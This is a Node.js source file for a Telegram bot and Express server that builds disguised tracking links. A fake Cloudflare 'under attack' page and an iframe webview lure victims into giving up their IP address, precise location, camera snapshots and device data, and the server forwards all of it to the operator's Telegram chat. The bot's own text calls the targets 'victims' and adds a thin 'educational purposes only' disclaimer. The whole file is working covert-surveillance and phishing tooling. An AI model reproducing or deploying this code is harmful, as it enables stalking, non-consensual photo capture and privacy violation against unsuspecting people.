const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const channels = ['@RenusHackingArmy', '@RenusBotsChannel'];

const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="https://trackdown-k1l1.onrender.com";
//TOGGLE for 1pt Proxy and Shorters
var use1pt=true;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/RenusHackingArmy");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/RenusHackingArmy");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 createLink(chatId,msg.text); 
}
  
if (msg.text == "/start") {
    const userId = msg.from.id;

    let isMemberOfAllChannels = true;

    for (let channel of channels) {
      try {
        const chatMember = await bot.getChatMember(channel, userId);
        if (chatMember.status == 'left' || chatMember.status == 'kicked') {
          isMemberOfAllChannels = false;
          break;
        }
      } catch (error) {
        isMemberOfAllChannels = false;
        break;
      }
    }

    if (!isMemberOfAllChannels) {
      var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;

const joinButtons =[
    { text: `Join Channel`, url: `https://t.me/RenusHackingArmy`},
   { text: `Join Channel`, url: `https://t.me/RenusBotsChannel`}], 
  [{ text: `Joined`, callback_data: '/start' }
  ];


const joinMarkup = {
  reply_markup: JSON.stringify({
    inline_keyboard: joinButtons
  })
};

      bot.sendMessage(chatId, joinMessage, joinMarkup);
    } else {
      var m = {
        reply_markup: JSON.stringify({
          "inline_keyboard": [[{ text: "ACCEPT TERMS AND CONDITIONS", callback_data: "terms" }]]
        })
      };

      bot.sendMessage(chatId, `Read the terms and conditions of this bot. If you use this bot so you agree to abide by our terms and conditions. This bot is made available for educational purposes only. I am not responsible for any illegal activities that result from the use of this bot. If you use this bot, you do so at your own risk. And if it causes any harm to anyone, then you yourself will be responsible for it. And thank you for using our service.`, m);
    }
}


else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`Join the all channel to start the bot. If you have not joined then join first. After that click on the button of term and condition. Now you create a URL. You can enter any URL that will be used in the iframe to attract potential victims. Once you provide the URL, the bot will send you two links that can be used to track individuals.\n\nThe first link, known as the Cloudflare link, displays a fake "under attack" page that collects information about the victim before redirecting them to the intended destination. The second link, known as the Webview link, displays a website (such as Bing or a dating site) within an iframe to collect information. Please note that some sites may not work with the Webview link due to an x-frame header present.
`);
}
  
  
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);

  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  } else if (callbackQuery.data === "terms") {
    aterms(callbackQuery.message.chat.id);
  }
});



bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://claim-event.co/short-url.php?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://claim-event.co/short-url.php?url=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nYour old URL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `New links has been created successfully.\nYour old URL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ Please enter a valid URL, including http or https. Ex- https://www.google.com`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
}

function aterms(chatId) {
  // Define the message you want to send
  const message = "You can use this bot to track any persons device just through a simple link. It can gather information like IP address, location and camera snaps, battery level, network info and a wide range of information about their device, plus many more benefits.\n\nNow you create a URL. click on the create link given below. You can now enter any URL in Create Link that will be used to lure potential victims. once you provide the URL to the bot, the bot will send you two links which can be used to track individuals.";
var m = {
        reply_markup: JSON.stringify({
          "inline_keyboard": [
          [{ text: "Create Link", callback_data: "crenew" }],
           [{ text: "Help Support", url: "https://t.me/RenusBotsGroup" }]
      ]
        })
      };
  // Send the message to the user
  bot.sendMessage(chatId, message, m);
}


app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
